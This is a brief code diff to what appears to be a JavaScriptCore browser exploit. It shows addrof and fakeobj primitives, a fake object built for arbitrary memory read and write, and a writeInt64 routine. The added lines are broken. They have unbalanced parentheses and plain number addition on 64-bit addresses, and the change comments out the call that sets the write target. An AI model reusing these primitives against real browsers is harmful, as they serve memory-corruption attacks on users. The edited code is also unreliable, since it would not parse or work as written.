@@ -522,9 +522,9 @@ for (var i = 0; i < 1000; ++i) {
     unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
     var boxed = [{}];
 
-    print("outer @ " + new Int64(addrof(container)));
+    print("outer @ " + new Int64(addrof(container)+0x10);
 
-    var hax = fakeobj(Add(addrof(container),new Int64("0x10")));
+    var hax = fakeobj(addrof(container) + 0x10));
     print("we have hax object ;)");
     print("after further work we can use this object for arbitrary r/w");
     print("now lets steal a real JSCellHeader")
@@ -560,7 +560,7 @@ for (var i = 0; i < 1000; ++i) {
         },
 	
 	writeInt64: function(where, what) {
-            set_victim_addr(where)
+            //set_victim_addr(where)
             victim1.prop = this.fakeobj(floatAsQword(what.asDouble()));
         },
 
